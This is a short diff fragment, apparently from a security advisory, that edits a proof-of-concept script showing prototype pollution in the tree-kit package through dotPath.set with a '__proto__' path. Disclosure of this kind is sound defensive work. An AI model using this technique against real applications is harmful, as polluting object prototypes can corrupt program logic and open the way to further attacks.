@@ -9,9 +9,9 @@
 // poc.js
 const { dotPath } = require('tree-kit')
 
-console.log(`Before: ${{}.polluted}`)
+console.log("Before: ", {}.polluted)
 dotPath.set({}, '__proto__.polluted', true)
-console.log(`After: ${{}.polluted}`)
+console.log("After: ", {}.polluted)
 ```
 2. Execute the following commands in the terminal:
 ```bash
